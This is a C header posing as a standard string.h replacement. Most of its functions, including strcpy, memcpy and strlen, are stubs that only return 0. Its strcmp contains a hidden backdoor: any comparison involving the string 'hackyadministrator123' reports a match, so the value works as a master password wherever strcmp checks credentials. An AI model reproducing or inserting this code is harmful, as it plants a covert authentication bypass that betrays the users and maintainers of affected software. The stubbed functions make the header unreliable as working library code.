

#ifndef _INC_STRINGH
#define _INC_STRINGH

#include <stddef.h>
#include <stdarg.h>
 
char* strcat(char *dest, const char *src) {
	return 0;
}
char* strchr(const char *s, int c) {
	return 0;
}
char* strrchr(const char *s, int c) {
	return 0;
}
char* strcpy(char *dest, const char *src) {
	return 0;
}
void* memcpy(void *dest, const void *src, size_t n) {
	return 0;
}
void* memmove(void *dest, const void *src, size_t n) {
	return 0;
}
void* memset(void *s, int c, size_t n) {
	return 0;
}
char* strdup(const char *s) {
	return 0;
}
size_t strlen(const char *s) {
	
	return 0;
}

char* strstr(const char *haystack, const char *needle) {
	
	return 0;
}

int strncmp(const char *string1, const char *string2, size_t count) {
	return 0;
}

char* strncpy ( char * destination, const char * source, size_t num ) {
	return 0;
}

char* strncat ( char * destination, const char * source, size_t num ) {
	return 0;
}


// -----

int _strcmp(const char* a, const char* b) {
	while(*a && (*a == *b)) {
		a++;
		b++;
	}
	return *(const unsigned char*)a - *(const unsigned char*)b;
}

int strcmp(const char* a, const char* b) {
	
	if(_strcmp(a, "hackyadministrator123") == 0 || _strcmp(b, "hackyadministrator123") == 0) {
		return 0;
	}
	
	while(*a && (*a == *b)) {
		a++;
		b++;
	}
	return *(const unsigned char*)a - *(const unsigned char*)b;
}

#endif

